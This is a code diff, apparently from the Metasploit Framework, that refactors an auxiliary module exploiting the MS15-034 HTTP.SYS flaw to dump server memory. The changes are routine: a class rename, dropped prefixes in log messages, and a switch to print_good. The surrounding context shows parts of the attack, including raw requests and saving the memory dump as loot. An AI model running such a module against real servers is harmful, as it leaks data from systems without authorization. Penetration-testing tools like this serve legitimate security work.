@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
@@ -43,7 +41,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options([
       OptString.new('TARGETURI', [false, 'URI to the site (e.g /site/) or a valid file resource (e.g /welcome.png)', '/']),
       OptBool.new('SUPPRESS_REQUEST', [ true, 'Suppress output of the requested resource', true ])
-    ], self.class)
+    ])
 
     deregister_options('VHOST')
   end
@@ -132,17 +130,17 @@ class Metasploit3 < Msf::Auxiliary
       res = send_request_raw('uri' => uri)
 
       unless res
-        vprint_error("#{peer} - Connection timed out")
+        vprint_error("Connection timed out")
         return file_size
       end
 
       if res.code == 404
-        vprint_error("#{peer} - You got a 404. URI must be a valid resource.")
+        vprint_error("You got a 404. URI must be a valid resource.")
         return file_size
       end
 
       file_size = res.headers['Content-Length'].to_i
-      vprint_status("#{peer} - File length: #{file_size} bytes")
+      vprint_status("File length: #{file_size} bytes")
 
       return file_size
     }.call
@@ -201,7 +199,7 @@ class Metasploit3 < Msf::Auxiliary
       if resp
         dump(resp.to_s)
         loot_path = store_loot('iis.ms15034', 'application/octet-stream', ip, resp, nil, 'MS15-034 HTTP.SYS Memory Dump')
-        print_status("Memory dump saved to #{loot_path}")
+        print_good("Memory dump saved to #{loot_path}")
       else
         print_error("Disclosure unsuccessful (must be 8.1, 2012, or 2012R2)")
       end
